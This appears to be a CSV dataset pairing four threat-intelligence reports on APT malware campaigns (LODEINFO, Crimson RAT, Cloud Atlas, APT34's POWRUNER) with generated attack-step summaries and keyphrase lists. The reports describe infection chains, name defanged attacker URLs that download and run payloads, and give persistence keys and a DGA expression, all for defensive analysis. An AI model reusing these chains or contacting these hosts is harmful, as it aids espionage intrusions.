article,summary,id,phrases,target
"securelist.com /apt10-tracking-down-lodeinfo-2022-part-i/107742/ APT10: Tracking down LODEINFO 2022, part IAuthorsSuguru IshimaruNew infection vector using SFX file and DOWNIISSA downloaderKaspersky has been tracking activities involving the LODEINFO malware family since 2019, looking for new modifications and thoroughly investigating any attacks utilizing those new variants. LODEINFO is sophisticated fileless malware first named in a blogpost from JPCERT/CC in February 2020. The malware was regularly modified and upgraded by the developers to target media, diplomatic, governmental and public sector organizations and think-tanks in Japan.1/11Japan is likely the main target of LODEINFOResearchers continued tracking LODEINFO after that. JPCERT/CC and Macnica Networks shared additional updates on LODEINFO activities in a later publication. Kaspersky researchers also shared new findings during the HITCON 2021 conference, covering LODEINFO activities from 2019 to 2020, and revealing high-confidence attribution to APT10.In March 2022, we observed a Microsoft Word file that was used as the infection vector in some attacks. In June of the same year, a SFX file was discovered targeting the Japanese government or related organizations using a decoy file with Japanese content, as well as utilizing the name of a famous Japanese politician in the filename. A new downloader shellcode named DOWNIISSA that is used to deploy the LODEINFO backdoor was also observed.The first part of this report will provide technical analysis of the new infection methods such as SFX files and DOWNIISSA along with our findings. The second part will provide technical analysis of the LODEINFO backdoor and the related shellcode for each version of the backdoor with the latest LODEINFO IoCs and related information discovered in 2022.Customers of Kaspersky Threat Intelligence Service have access to additional private APT reports describing past LODEINFO activities. Initial infection #1: VBA + DLL sideloading2/11During our investigation of the attacks in March 2022, we observed a spear-phishing email with a malicious attachment installing malware persistence modules, which consisted of a legitimate EXE file and a malicious DLL file loaded via the DLL sideloading technique. For example, the following section uploaded to Virustotal. Once the target opens the malicious doc file, a message in Japanese is displayed (インターネットセキュリティによると、ファイルをくために、ののドキュメントバーの 「をにする」と「コンテンツの」をクリックしてください。Translation: “According to your internet security settings, click “Enable Editing” and “Enable Content” on the yellow document bar above to open this file.”) to trick the victims into clicking “Enable Content” and enabling the embedded macro.The message in Japanese to trick the target into clicking “Enable Content” and embedded VBA codeThe embedded VBA code creates the folder C:\Users\Public\TMWJPA\ and drops a zip file named two files named NRTOLF.exe and K7SysMn1.dll. NRTOLF.exe (MD5: malicious DLL sideloaded by NRTOLF.exe. The malicious DLL file contains a loader of the LODEINFO shellcode. This DLL is a known loader module of LODEINFO. It contains a one-byte XOR-encrypted LODEINFO shellcode internally identified by version 0.5.9. This infection method was also used by the threat actor in the previous attacks we investigated.Apart from this, we discovered two more implants related to LODEINFO that were used in other infection methods in 2022. Initial infection #2: SFX + DLL sideloadingOne of the implants is a self-extracting archive (SFX) file in RAR format (MD5 commands shown below. There is also a comment added by the malware author written in Japanese that can be translated as “The following comment contains a self-extracting script command”:12345678910111213141516Comment = ;のコメントはスクリプトコマンドをんでいます(Path=%temp%\Setup=%temp%\1.docxSetup=%temp%\K7SysMon.ExeSilent=1Overwrite=1Date Time Attr Size Compressed Name------------------- ----- ------------ ------------ ------------------------2022-06-14 03:47:04 A 11900 9181 1.docx2021-08-18 18:58:58 A 342528 169345 K7SysMn1.dll2022-04-19 09:44:45 A 91464 45247 K7SysMon.Exe------------------- ----- ------------ ------------ ------------------------2022-06-14 03:47:04 445892 223773 3 filesWhen a targeted user executes this SFX file, the archive drops other files to %temp% dir and opens 1.docx as a decoy containing just a few Japanese words such as  (“Application”),  (“name”) and メールアドレス (“email address”), as shown on the following screenshot.4/11Simple decoy document content from 1.docxWhile showing the decoy file to the user, the archive script starts K7SysMon.exe, which loads the The K7SysMn1.dll contains a BLOB with an obfuscated routine not observed in past activities. The embedded BLOB is divided into four-byte chunks, and each part is stored in one of the 50 randomly named export functions of the DLL binary. These export functions reconstruct the BLOB in an allocated buffer and then decode the LODEINFO shellcode using a one-byte XOR key.5/11Reassembling the payload BLOB from partsThe payload that is eventually deployed by this implant is the LODEINFO v0.6.3. Initial infection #3: SFX + DLL sideloading + additional BLOB fileWe also discovered another similar SFX file named <masked>[1]sns のおい.exe (Translation: The spreading request for sns movie of <masked>). The attackers exploited the name of a well-known Japanese politician. The embedded self-extracting script and files are very similar to the previous sample discussed in the Initial Infection #2 section of this article. However, this sample contains an additional file named K7SysMon.Exe.db. Previously observed loader modules had a BLOB with the encrypted shellcode embedded in the executable file, but in this sample K7SysMn1.dll does not contain the BLOB. Instead, the loader module reads the K7SysMon.Exe.db file as the encrypted BLOB and decrypts the shellcode, which is the LODEINFO v0.6.3 backdoor. The title of the SFX file, as well as the document content, displays a request to spread a video of the famous politician for SNS (Social Network Service). We believe this SFX file was spread via a spear-phishing email on June 29, 2022, based on the last archiving timestamp. The file name and the decoy document suggest the target was the Japanese archived files, the payload and also the C2 address were very similar to the previous sample set. The only notable difference was the Japanese title of the decoy document: “のおい” (“Request for coverage”). We think this SFX file was probably used to target Japanese media companies. Initial infection #4: VBA + undiscovered downloader shellcode DOWNIISSABack in August 2020, we discovered a fileless downloader shellcode dubbed DOWNJPIT, a variant of the LODEINFO malware, and gave a presentation on it at HITCON 2021. In June 2022, we found another fileless downloader shellcode delivered by a password-protected Microsoft Word file. The filename is  のびの.doc (“Enhancing the deterrence and coping power of the Japan-US alliance.doc”). The document file contains malicious macro code that is completely different from previously investigated samples. Once opened, the doc file shows a Japanese message to enable the following VBA code.Malicious VBA code inside MS Word file found in June 2022Unlike past samples, such as the one described in the Initial Infection #1 section of this article, where the malicious VBA macro was used to drop different components of the DLL sideloading technique, in this case the malicious macro code injects and loads an embedded shellcode in the memory of the7/11WINWORD.exe process directly. This implant was not present in past activities and the shellcode is also a newly discovered multi-stage downloader shellcode for LODEINFO v0.6.5.This downloader shellcode was completely different from the DOWNJPIT variant. The new downloader shellcode has two URLs inside:url url named this new downloader DOWNIISSA, where IISSA is a string derived from 11554 in the file names found in the URLs. The following diagram shows the complicated infection flow from the malicious document file to the final payload downloaded by DOWNIISSA.LODEINFO infection process via DOWNIISSAAs mentioned earlier, the embedded macro generates the DOWNIISSA shellcode and injects it in the current process (WINWORD.exe). The main downloader code is base64-encoded and placed at the beginning of the DOWNIISSA shellcode, which gets decoded and patched by the shellcode itself.8/11DOWNIISSA base64 decode and self-patchAfter it has been decoded, some important strings are found with a one-byte XOR encryption. For example, the two C2 destination addresses are decrypted in the following code.XORed C2 destinations embedded in the main function of DOWNIISSA shellcodeDOWNIISSA uses the URLDownloadToFileA() API function to download the BLOB from the URL addresses and drop it as %TEMP%/${temp}.tmp. Then it reads the file into allocated memory in the current process and deletes the downloaded temp file immediately. We confirmed that both URLs served the same binary data that was XORed with the one-byte XOR key stored at the end of the BLOB itself. After XOR decryption, the LODEINFO backdoor shellcode v0.6.5 was found. For the final stage of the infection, DOWNIISSA creates an instance of msiexec.exe and injects the LODEINFO backdoor shellcode in the memory of the process.This new infection flow involving the DOWNIISSA shellcode has not been seen in previous activities using LODEINFO and is a new TTP in 2022.Apart from the 11554.htm file found in this sample, we also discovered files with other names such as 3390.htm, 5246.htm and 16412.htm, hosted on the same C2 servers in July 2022. 3390.htm (MD5: were one-byte XORed LODEINFO v0.6.5 shellcodes downloaded via DOWNIISSA malware. The XOR key for each sample was found at the end of the file. The 5246.htm (MD5: files are one-byte XORed unique data structures. The data structure found in the 5246.htm file is shown Memory allocation size (probably) The size of this data structure without memory allocation size and data size9/110x000008 ‘K7SysMon.Exe’,0 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 00Number of embedded files Data size of embedded file1 Filename size of embedded file1 Filename of file10x00001BB8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00The legitimate EXE file for DLL ‘K7SysMn1.dll’,0 4D 5A 90 00 03 00 00 00 04 00 00 00 FF FF 00 000x016575B8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 ‘K7SysMon.Exe.db’,0 73 3A 3C 9B 9A CF 11 76 11 DF 8A 1F 5A EF 9F 11 DF 92 C7 59 CC 11 EF 96 CD 11 E7 92 A1 64 EC BF [SKIPPED]Data size of embedded file2 Filename size of embedded file2 Filename of file2Malicious DLL file that is the loading module of LODEINFO without embedded BLOBData size of embedded file3 Filename size of embedded file3 Filename of file3 A byte XORed BLOB is read by the loading module to infect LODEINFO v0.6.5. The key is at the end of the dataThis data structure contains the names of three files: K7SysMon.exe, K7SysMn1.dll (MD5: downloads 5246.htm from the C2 to assist with the installation of some embedded files on the victim’s machine. ConclusionsLODEINFO was first discovered in 2019. LODEINFO and its infection methods have been constantly updated and improved to become a more sophisticated cyber-espionage tool while targeting organizations in Japan. The LODEINFO implants and loader modules were also continuously updated to evade security products and complicate manual analysis by security researchers.These modifications may serve as a confirmation that the threat actors track publications by security researchers and learn how to update their TTPs and improve their malware. In fact, we haven’t detected any activities involving the LILIMRAT and the DOWNJPIT malware from this threat actor since publishing our investigation results at HITCON 2021. We believe this cat-and-mouse game will continue in the future.To be continued in Part II…10/11[1] Personal name of Japanese politician was masked to protect their identity.11/11 ","1. The attacker sends a spear-phishing email with a malicious Microsoft Word document attachment. 2. The document contains macros that execute when the victim enables content. The macros drop malware components using DLL sideloading. 3. Alternatively, the document contains the DOWNIISSA downloader shellcode embedded in VBA code. When macros are enabled, this shellcode is injected into the Word process. 4. DOWNIISSA connects to a command and control server to download the LODEINFO backdoor. 5. For attacks using self-extracting archives, the SFX file is sent via spear-phishing. It pretends to contain a video but drops malware. 6. When the SFX is opened, it extracts DLLs and executables to staging folders and executes them to deploy LODEINFO using DLL sideloading. 7. In some cases, the SFX also extracts an additional blob file containing the encrypted backdoor shellcode. 8. The downloaded LODEINFO backdoor provides the attacker remote access and enables further exploitation. 9. New versions of LODEINFO and downloaders like DOWNIISSA are continuously developed to evade detection. ",valid_61,"['The attacker', 'a spear-phishing email', 'US', 'Microsoft Word', 'the document', 'EXE', 'EC', 'the victim', 'content', 'malware', 'DLL sideloading', 'DOWNIISSA', 'VBA code', 'the LODEINFO backdoor', 'attacks', 'the SFX file', 'a video', 'BLOB', 'access']",The attacker; a spear-phishing email; US; Microsoft Word; the document; EXE; EC; the victim; content; malware; DLL sideloading; DOWNIISSA; VBA code; the LODEINFO backdoor; attacks; the SFX file; a video; BLOB; access.
"3/2/2020Targeted Attack on Indian Ministry of External Affairs using Crimson RAT – VolonTargeted Attack on Indian Ministry of External Affairs using Crimson RATvolon.io/2018/09/07/targeted-attack-on-indian-ministry-of-external-affairs-using-crimson-ratIntroduction Volon’s Research team observed a spear phishing attack on Ofﬁcials of Indian Ministry of External Affairs in early August. Crimson RAT was used as attack vector in this instance, same TTPs were observed by an APT group since 2016.The email lures the ofﬁcials by asking them to download the MS Excel sheet named “amended training schedule of IFS ofﬁcers”. The download link provided in the email is shown as “hxxps://www.mea.gov.in/ifs-traning.schedule”, but it actually points to the malicious XLS document from URL: hxxp://info-sharing.net/?a=1533541533.The document contains malicious macro code which drops ﬁrst payload, the dropped payload is Crimson RAT downloader. This payload further downloads fully functional Crimson RAT from the following IP: 151.106.19[.]207:8246A document with similar TTP was also identiﬁed in early august with the name “MoFA-MoD AFghanistan.xls” uploaded on 3rd August 2018. The XLS ﬁle contains malicious macro code, which upon execution downloads Payload from URL:”hxxp://afgcloud7.com/upld/updt.dll”In 2016, Proofpoint published a report on “Operation Transparent Tribe”. The report had details of various attacks against Indian Embassies in Saudi Arabia and Kazakhstan using Crimson RAT. And, in one of the campaigns, they found a XLS ﬁle fetching payload from same URL as we found in second campaign URL: “hxxp://afgcloud7.com/upld/updt.dll”. These details might indicate that the APT group behind Operation Transparent Tribe is active and targeting Indian ofﬁcials, again.Spear Phishing Emailurl Attack on Indian Ministry of External Affairs using Crimson RAT – VolonSpear Phishing Email The lure of the campaign states the President’s schedule for the various meetings.First payload download fully functional Crimson RAT and drop it to following path: “C:\\ProgramData\\Hurmz\\bahgrtmrs.exe”.The payload has the capability to kill any process running in the system by using following code:url Attack on Indian Ministry of External Affairs using Crimson RAT – VolonThe following code is used to parse the commands which payload receives from the C&C:Following is the list of some of the commands that the payload (Crimson RAT) supports:1. proc1 – List all the running processes. 2. getavs – List of antiviruses running on the system. 3. ﬁlz – Send ﬁle info to C&C 4. dowf – Download ﬁle from C&C 5. cownr – Update the binary. 6. dirs – Send disk drives list. 7. aﬁle – Send ﬁle to C&CApart from above commands, the RAT has more functionalities like keylogging, browser credential theft and webcam access.Conclusion Based on the above campaigns, its TTPs, payload used and past reporting, there is high probability that the APT group behind “Operation Transparent Tribe” might be active and is targeting Indian organizations, again.Indicators of Compromise hxxp://info-sharing.net/?a=1533541533url ","1. The attacker sends a phishing email to Indian government officials claiming to contain a training schedule Excel file. 2. The email provides a link to download the Excel file containing malicious macros. 3. The macro code executes on the victim's system and downloads an initial Crimson RAT downloader payload. 4. The downloader retrieves the full Crimson RAT executable from a specified IP address. 5. Crimson RAT is dropped and executed, establishing persistence on the infected system. 6. Crimson RAT kills other processes, parses C2 commands, performs keylogging, steals credentials, accesses webcam, etc. 7. C2 communications occur with the attacker's infrastructure to control the infected host. 8. Volon identifies similarities to previous Operation Transparent Tribe activity based on TTPs. 9. IOCs are provided including payload hashes, IP addresses, and malicious document names. ",valid_17,"['Attack', 'Indian', 'Excel', 'the email', 'code', 'Crimson RAT downloader', 'payload', 'IP', 'commands', 'keylogging', 'access', 'Operation Transparent Tribe', 'TTPs']",Attack; Indian; Excel; the email; code; Crimson RAT downloader; payload; IP; commands; keylogging; access; Operation Transparent Tribe; TTPs.
"8/16/2019Recent Cloud Atlas activity | SecurelistRecent Cloud Atlas activity securelist.com/recent-cloud-atlas-activity/92016By GReATAlso known as Inception, Cloud Atlas is an actor that has a long history of cyber-espionage operations targeting industries and governmental entities. We ﬁrst reported Cloud Atlas in 2014 and we’ve been following its activities ever since.From the beginning of 2019 until July, we have been able to identify different spear-phishing campaigns related to this threat actor mostly focused on Russia, Central Asia and regions of Ukraine with ongoing military conﬂicts.Countries targeted by Cloud Atlas recentlyCloud Atlas hasn’t changed its TTPs (Tactic Tools and Procedures) since 2018 and is still relying on its effective existing tactics and malware in order to compromise high value targets.The Windows branch of the Cloud Atlas intrusion set still uses spear-phishing emails to target high proﬁle victims. These emails are crafted with Ofﬁce documents that use malicious remote templates – whitelisted per victims – hosted on remote servers. We described one of the techniques used by Cloud Atlas in 2017 and our colleagues at Palo Alto Networks also wrote about it in November 2018.Previously, Cloud Atlas dropped its “validator” implant named “PowerShower” directly, after exploiting the Microsoft Equation vulnerability (CVE-2017-11882) mixed with CVE-2018-0802. During recent months, we have seen a new infection chain, involving a polymorphic HTA, a new and polymorphic VBS implant aimed at executing PowerShower, and the Cloud Atlas second stage modular backdoor that we disclosed ﬁve years ago in our ﬁrst blogpost about them and which remains unchanged. Let’s meet PowerShowerurl Cloud Atlas activity | SecurelistPowerShower, named and previously disclosed by Palo Alto Networks in their blogspot (see above), is a malicious piece of PowerShell designed to receive PowerShell and VBS modules to execute on the local computer. This malware has been used since October 2018 by Cloud Atlas as a validator and now as a second stage. The differences in the two versions reside mostly in anti-forensics features for the validator version of PowerShower.The PowerShower backdoor – even in its later developments – takes three commands:Com‐ faultDescriptionIt is the ﬁrst byte of the magic PK. The implant will save the received content as a ZIP ar‐ chive under %TEMP%\PG.zip.It is the ﬁrst byte of “On resume error”. The implant saves the received content as a VBS script under “%APPDATA%\Microsoft\Word\[A-Za-z]{4}.vbs” and executes it by using Wscript.exe If the ﬁrst byte doesn’t match 0x80 or 0x79, the content is saved as an XML ﬁle under “%TEMP%\temp.xml”. After that, the script loads the content of the ﬁle, parses the XML to get the PowerShell commands to execute, decodes them from Base64 and invokes IEX. After executing the commands, the script deletes “%TEMP%\temp.xml” and sends the content of “%TEMP%\pass.txt” to the C2 via an HTTP POST request.A few modules deployed by PowerShower have been seen in the wild, such as:A PowerShell document stealer module which uses 7zip (present in the received PG.zip) to pack and exﬁltrate *.txt, *.pdf, *.xls or *.doc documents smaller than 5MB modiﬁed during the last two days; A reconnaissance module which retrieves a list of the active processes, the current user and the current Windows domain. Interestingly, this feature is present in PowerShower but the condition leading to the execution of that feature is never met in the recent versions of PowerShower; A password stealer module which uses the opensource tool LaZagne to retrieve passwords from the infected system.We haven’t yet seen a VBS module dropped by this implant, but we think that one of the VBS scripts dropped by PowerShower is a dropper of the group’s second stage backdoor documented in our article back in 2014. And his new friend, VBShowerurl Cloud Atlas activity | SecurelistDuring its recent campaigns, Cloud Atlas used a new “polymorphic” infection chain relying no more on PowerShower directly after infection, but executing a polymorphic HTA hosted on a remote server, which is used to drop three different ﬁles on the local system.A backdoor that we name VBShower which is polymorphic and replaces PowerShower as a validator; A tiny launcher for VBShower ; A ﬁle computed by the HTA which contains contextual data such as the current user, domain, computer name and a list of active processes.This “polymorphic” infection chain allows the attacker to try to prevent IoC-based defence, as each code is unique by victim so it can’t be searched via ﬁle hash on the host.The VBShower backdoor has the same philosophy of the validator version of PowerShower. Its aim is to complicate forensic analysis by trying to delete all the ﬁles contained in “%APPDATA%\ \Local\Temporary Internet Files\Content.Word” and “%APPDATA%\ \Local Settings\Temporary Internet Files\Content.Word\”.Once these ﬁles have been deleted and its persistence is achieved in the registry, VBShower sends the context ﬁle computed by the HTA to the remote server and tries to get via HTTP a VBS script to execute from the remote server every hour.At the time of writing, two VBS ﬁles have been seen pushed to the target computer by VBShower. The ﬁrst one is an installer for PowerShower and the second one is an installer for the Cloud Atlas second stage modular backdoor which communicates to a cloud storage service via Webdav. Final wordsurl Cloud Atlas activity | SecurelistCloud Atlas remains very proliﬁc in Eastern Europe and Central Asia. The actor’s massive spear- phishing campaigns continue to use its simple but effective methods in order to compromise its targets.Unlike many other intrusion sets, Cloud Atlas hasn’t chosen to use open source implants during its recent campaigns, in order to be less discriminating. More interestingly, this intrusion set hasn’t changed its modular backdoor, even ﬁve years after its discovery. IoCsSome emails used by the attackersinfocentre.gov@mail.ru middleeasteye@asia.com simbf2019@mail.ru world_overview@politician.com infocentre.gov@bk.ruVBShower registry persistenceKey : HKCU\Software\Microsoft\Windows\CurrentVersion\Run\[a-f0-9A-F]{8} Value : wscript //B “%APPDATA%\[A-Za-z]{5}.vbs”VBShower paths%APPDATA%\[A-Za-z]{5}.vbs.dat %APPDATA%\[A-Za-z]{5}.vbs %APPDATA%\[A-Za-z]{5}.mdsVBShower C2s "," 1. Cloud Atlas sends spearphishing emails with malicious Office document attachments to high-value targets. 2. The documents contain links to remote templates hosted on attacker servers. 3. When the document is opened, it retrieves the remote template, which contains exploit code. 4. The exploit (CVE-2017-11882 or CVE-2018-0802) executes a polymorphic HTA file. 5. The HTA file drops and executes the VBShower VBS implant. 6. VBShower establishes registry persistence, deletes forensic artifacts, and retrieves a PowerShower PowerShell implant. 7. PowerShower can retrieve additional modules from the attackers for specific functionality. 8. VBShower also retrieves and executes a VBS script that installs the Cloud Atlas modular backdoor. 9. The backdoor communicates with attacker command servers via WebDAV for further control, data exfiltration, etc. ",valid_59,"['Cloud Atlas', 'documents', 'remote templates', 'CVE-2017-11882', 'CVE-2018-0802', 'a polymorphic HTA', 'the HTA', 'VBShower', 'PowerShower', 'PowerShell', 'the attackers', 'a VBS script', 'WebDAV']",Cloud Atlas; documents; remote templates; CVE-2017-11882; CVE-2018-0802; a polymorphic HTA; the HTA; VBShower; PowerShower; PowerShell; the attackers; a VBS script; WebDAV.
"December 07, 2017 | by Manish Sardiwal, Yogesh Londhe, Nalani Fraser, Nicholos Richard, Jaqueline O’Leary, Vincent Cannon | Threat ResearchLess than a week after Microsoft issued a patch for CVE-2017-11882 on Nov. 14, 2017, FireEye observed an attacker using an exploit for the Microsoft Office vulnerability to target a government organization in the Middle East. We assess this activity was carried out by a suspected Iranian cyber espionage threat group, whom we refer to as APT34, using a custom PowerShell backdoor to achieve its objectives.We believe APT34 is involved in a long-term cyber espionage operation largely focused on reconnaissance efforts to benefit Iranian nation-state interests and has been operational since at least 2014. This threat group has conducted broad targeting across a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. We assess that APT34 works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. The full report on APT34 is available to our MySIGHT customer community.APT34 uses a mix of public and non-public tools, often conducting spear phishing operations using compromised accounts, sometimes coupled with social engineering tactics. In May 2016, we published a blog detailing a spear phishing campaign targeting banks in the Middle East region that used macro-enabled attachments to distribute POWBAT malware. We now attribute that campaign to APT34. In July 2017, we observed APT34 targeting a Middle East organization using a PowerShell-based backdoor that we call POWRUNER and a downloader with domain generation algorithm functionality that we call BONDUPDATER, based on strings within the malware. The backdoor was delivered via a malicious .rtf file that exploited CVE- 2017-0199.In this latest campaign, APT34 leveraged the recent Microsoft Office vulnerability CVE-2017-11882 to deploy POWRUNER and BONDUPDATER.CVE-2017-11882 affects several versions of Microsoft Office and, when exploited, allows a remote user to run arbitrary code in the context of the current user as a result of improperly handling objects in memory. The vulnerability was patched by Microsoft on Nov. 14, 2017. A full proof of concept (POC) was publicly released a week later by the reporter of the vulnerability.The vulnerability exists in the old Equation Editor (EQNEDT32.EXE), a component of Microsoft Office that is used to insert and evaluate mathematical formulas. The Equation Editor is embedded in Office documents using object linking and embedding (OLE) technology. It is created as a separate process instead of child process of Office applications. If a crafted formula is passed to the Equation Editor, it does not check the data length properly while copying the data, which results in stack memory corruption. As the EQNEDT32.exe iscompiled using an older compiler and does not support address space layout randomization (ASLR), a technique that guards against the exploitation of memory corruption vulnerabilities, the attacker can easily malicious spear phishing email sent to the victim organization. The malicious file exploits CVE-2017-11882, which corrupts the memory on the stack and then proceeds to push the malicious data to the stack. The malware then overwrites the function address with the address of an existing instruction from EQNEDT32.EXE. The overwritten instruction (displayed in Figure 1) is used to call the “WinExec” function from kernel32.dll, as depicted in the instruction at 00430c12, which calls the “WinExec” function.Figure 1: Disassembly of overwritten function addressAfter exploitation, the ‘WinExec’ function is successfully called to create a child process, “mshta.exe”, in the context of current logged on user. The process “mshta.exe” downloads a malicious script from hxxp://mumbai- m[.]site/b.txt and executes it, as seen in Figure 2.Figure 2: Attacker data copied to corrupt stack bufferThe malicious script goes through a series of steps to successfully execute and ultimately establish a connection to the command and control (C2) server. The full sequence of events starting with the exploit document is illustrated in Figure 3.Figure 3: CVE-2017-11882 and POWRUNER attack sequence1. The malicious .rtf file exploits CVE-2017-11882. 2. The malware overwrites the function address with an existing instruction from EQNEDT32.EXE. 3. The malware creates a child process, “mshta.exe,” which downloads a file from: hxxp://mumbai-m[.]site/b.txt.4. b.txt contains a PowerShell command to download a dropper from: hxxp://dns-update[.]club/v.txt. ThePowerShell command also renames the downloaded file from v.txt to v.vbs and executes the script.5. The v.vbs script drops four components (hUpdateCheckers.base, dUpdateCheckers.base,cUpdateCheckers.bat, and GoogleUpdateschecker.vbs) to the directory: C:\ProgramData\Windows\Microsoft\java\6. v.vbs uses CertUtil.exe, a legitimate Microsoft command-line program installed as part of CertificateServices, to decode the base64-encoded files hUpdateCheckers.base and dUpdateCheckers.base, and drop hUpdateCheckers.ps1 and dUpdateCheckers.ps1 to the staging directory.7. cUpdateCheckers.bat is launched and creates a scheduled task for GoogleUpdateschecker.vbspersistence.8. GoogleUpdateschecker.vbs is executed after sleeping for five seconds. 9. cUpdateCheckers.bat and *.base are deleted from the staging directory.Figure 4 contains an excerpt of the v.vbs script pertaining to the Execution Workflow section.Figure 4: Execution Workflow Section of v.vbsAfter successful execution of the steps mentioned in the Execution Workflow section, the Task Scheduler will launch GoogleUpdateschecker.vbs every minute, which in turn executes the dUpdateCheckers.ps1 and hUpdateCheckers.ps1 scripts. These PowerShell scripts are final stage payloads – they include a downloader with domain generation algorithm (DGA) functionality and the backdoor component, which connect to the C2 server to receive commands and perform additional malicious activities.The backdoor component, POWRUNER, is a PowerShell script that sends and receives commands to and from the C2 server. POWRUNER is executed every minute by the Task Scheduler. Figure 5 contains an excerpt of the POWRUNER backdoor.Figure 5: POWRUNER PowerShell script hUpdateCheckers.ps1POWRUNER begins by sending a random GET request to the C2 server and waits for a response. The server will respond with either “not_now” or a random 11-digit number. If the response is a random number, POWRUNER will send another random GET request to the server and store the response in a string. POWRUNER will then check the last digit of the stored random number response, interpret the value as a command, and perform an action based on that command. The command values and the associated actions are described in Table 1.CommandDescriptionAction01Server response string commands and send results back to serverServer response string is a file pathCheck for file path and upload (PUT) the file to server2Server response string is a file pathCheck for file path and download (GET) the fileTable 1: POWRUNER commandsAfter successfully executing the command, POWRUNER sends the results back to the C2 server and stops execution.The C2 server can also send a PowerShell command to capture and store a screenshot of a victim’s system. POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued. Figure 6 shows the PowerShell “Get-Screenshot” function sent by the C2 server.Figure 6: Powershell Screenshot FunctionalityOne of the recent advancements by APT34 is the use of DGA to generate subdomains. The BONDUPDATER script, which was named based on the hard-coded string “B007”, uses a custom DGA algorithm to generate subdomains for communication with the C2 server.Figure 7 provides a breakdown of how an example domain (456341921300006B0C8B2CE9C9B007.mumbai- m[.]site) is generated using BONDUPDATER’s custom DGA.Figure 7: Breakdown of subdomain created by BONDUPDATER1. This is a randomly generated number created using the following expression: $rnd = -join (Get-Random -InputObject (10 99) -Count (%{ Get-Random -InputObject (1 6)}));2. This value is either 0 or 1. It is initially set to 0. If the first resolved domain IP address starts with24.125.X.X, then it is set to 1.3. Initially set to 000, then incremented by 3 after every DNS request 4. First 12 characters of system UUID. 5. “B007” hardcoded string. 6. Hardcoded domain “mumbai-m[.]site”BONDUPDATER will attempt to resolve the resulting DGA domain and will take the following actions based on the IP address resolution:1. Create a temporary file in %temp% locationThe file created will have the last two octets of the resolved IP addresses as its filename.2. BONDUPDATER will evaluate the last character of the file name and perform the corresponding actionfound in Table 2.CharacterDescription012File contains batch commands, it executes the batch commandsRename the temporary file as .ps1 extensionRename the temporary file as .vbs extensionTable 2: BONDUPDATER ActionsFigure 8 is a screenshot of BONDUPDATER’s DGA implementation.Figure 8: Domain Generation AlgorithmSome examples of the generated subdomains observed at time of execution include:143610035BAF04425847B007.mumbai-m[.]site835710065BAF04425847B007.mumbai-m[.]site376110095BAF04425847B007.mumbai-m[.]siteFigure 9 shows example network communications between a POWRUNER backdoor client and server.Figure 9: Example Network CommunicationIn the example, the POWRUNER client sends a random GET request to the C2 server and the C2 server sends the random number (99999999990) as a response. As the response is a random number that ends with ‘0’, POWRUNER sends another random GET request to receive an additional command string. The C2 server sends back Base64 encoded response.If the server had sent the string “not_now” as response, as shown in Figure 10, POWRUNER would have ceased any further requests and terminated its execution.Figure 10: Example ""not now"" server responsePOWRUNER may also receive batch commands from the C2 server to collect host information from the system. This may include information about the currently logged in user, the hostname, network configurationdata, active connections, process information, local and domain administrator accounts, an enumeration of user directories, and other data. An example batch command is provided in Figure 11.Figure 11: Batch commands sent by POWRUNER C2 serverAPT34 has used POWRUNER and BONDUPDATER to target Middle East organizations as early as July 2017. In July 2017, a FireEye Web MPS appliance detected and blocked a request to retrieve and install an APT34 POWRUNER / BONDUPDATER downloader file. During the same month, FireEye observed APT34 target a separate Middle East organization using a malicious .rtf file (MD5: 63D66D99E46FB93676A4F475A65566D8) that exploited CVE-2017-0199. This file issued a GET request to dupatechecker.exe from the same server. The file also contains a comment by the malware author that appears to be an apparent taunt to security researchers.Figure 12: Contents of dupdatechecker.doc scriptThe dupatechecker.exe file (MD5: C9F16F0BE8C77F0170B9B6CE876ED7FB) drops both BONDUPDATER and POWRUNER. These files connect to proxychecker[.]pro for C2.Recent activity by APT34 demonstrates that they are capable group with potential access to their own development resources. During the past few months, APT34 has been able to quickly incorporate exploits for at at least two publicly vulnerabilities (CVE-2017-0199 and CVE-2017-11882) to target organziations in the Middle East. We assess that APT34’s efforts to continuously update their malware, including the incorporation of DGA for C2, demonstrate the group’s commitment to pursing strategies to deter detection. We expect APT34 will continue to evolve their malware and tactics as they continue to pursue access to entities in theMiddle East region.Filename / Domain / IP AddressMD5 Hash or DescriptionCVE-2017-11882 exploit documentA0E6933F4E0497269620F44A083B2ED4b.txt9267D057C065EA7448ACA1511C6F29C7v.txt/v.vbsB2D13A336A3EB7BD27612BE7D4E334DFdUpdateCheckers.base4A7290A279E6F2329EDD0615178A11FFhUpdateCheckers.base841CE6475F271F86D0B5188E4F8BC6DBcUpdateCheckers.bat52CA9A7424B3CC34099AD218623A0979dUpdateCheckers.ps1BBDE33F5709CB1452AB941C08ACC775EhUpdateCheckers.ps1247B2A9FCBA6E9EC29ED818948939702GoogleUpdateschecker.vbs C87B0B711F60132235D7440ADD0360B0hxxp://mumbai-m[.]sitePOWRUNER C2hxxp://dns-update[.]clubMalware Staging ServerCVE-2017-0199 exploit hpserver[.]online & anyportals[.]comv7-hpserver.online.htaE6AC6F18256C4DDE5BF06A9191562F82dUpdateCheckers.base3C63BFF9EC0A340E0727E5683466F435hUpdateCheckers.baseEEB0FF0D8841C2EBE643FE328B6D9EF5cUpdateCheckers.batFB464C365B94B03826E67EABE4BF9165dUpdateCheckers.ps1635ED85BFCAAB7208A8B5C730D3D0A8ChUpdateCheckers.ps113B338C47C52DE3ED0B68E1CB7876AD2googleupdateschecker.vbsDBFEA6154D4F9D7209C1875B2D5D70D5hpserver[.]onlineC2v7-anyportals.htaEAF3448808481FB1FDBB675BC5EA24DEdUpdateCheckers.base42449DD79EA7D2B5B6482B6F0D493498hUpdateCheckers.baseA3FCB4D23C3153DD42AC124B112F1BAEdUpdateCheckers.ps1EE1C482C41738AAA5964730DCBAB5DFFhUpdateCheckers.ps1E516C3A3247AF2F2323291A670086A8Fanyportals[.]comC2This entry was posted on Thu Dec 07 12:00:00 EST 2017 and filed under Yogesh Londhe, Nalani Fraser, Vincent Cannon, Threat Research, Manish Sardiwal, Jaqueline O’Leary, Nicholos Richard, Middle East, and APT.Get information and insight on today's advanced threats from the leader in advanced threat prevention. First NameLast NameEmail AddressCompany Name Executive Perspective BlogThreat Research BlogProducts and Services BlogSubscribeContact Us +1 888-227-2721Company 